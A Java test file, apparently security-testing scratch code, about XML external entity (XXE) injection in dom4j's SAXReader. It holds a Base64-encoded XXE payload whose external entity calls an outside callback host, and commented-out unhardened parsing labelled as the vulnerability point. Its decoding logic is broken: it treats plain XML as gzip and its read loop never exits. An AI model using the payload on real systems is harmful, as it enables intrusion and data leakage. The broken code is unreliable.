package com.mechoy.dom4j;

import org.dom4j.Document;
import org.dom4j.io.SAXReader;

import javax.swing.plaf.synth.SynthOptionPaneUI;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.util.Base64;
import java.util.Objects;
import java.util.zip.GZIPInputStream;

public class SAXReaderTest {
    public static void main(String[] args) throws Exception {
//        // 获取类加载器
//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//
//        // 读取资源文件
//        try (InputStream inputStream = Objects.requireNonNull(classLoader.getResourceAsStream("SAXReaderXml.txt"))) {
//            if (inputStream == null) {
//                throw new IllegalArgumentException("文件未找到！");
//            }
//
//            Document read = new SAXReader().read(inputStream);  // 漏洞点
//            System.out.println(read.getRootElement().getText());
//
//        } catch (Exception e) {
//            e.printStackTrace();
//        }

        String s = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIEFOWSBbCjwhRU5USVRZIHRoaXMgU1lTVEVNICJodHRwOi8vMTIzNC5iZTQ0ZDc0ZjMxLmlwdjYuMTQzMy5ldS5vcmcuIj4KXT4KPHg+JnRoaXM7PC94Pg==";
        byte[] bytes = Base64.getDecoder().decode(s);

        GZIPInputStream gis = new GZIPInputStream(new ByteArrayInputStream(bytes));
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        byte[] byteArray;
        while (true) {
            int len = gis.read(buf);
            if (len >= 0) {
                baos.write(buf, 0, len);
            } else {
                gis.close();
                byteArray = baos.toByteArray();
                String s1 = new String(byteArray, "UTF-8");
                System.out.println(s1);
            }
        }




    }
}
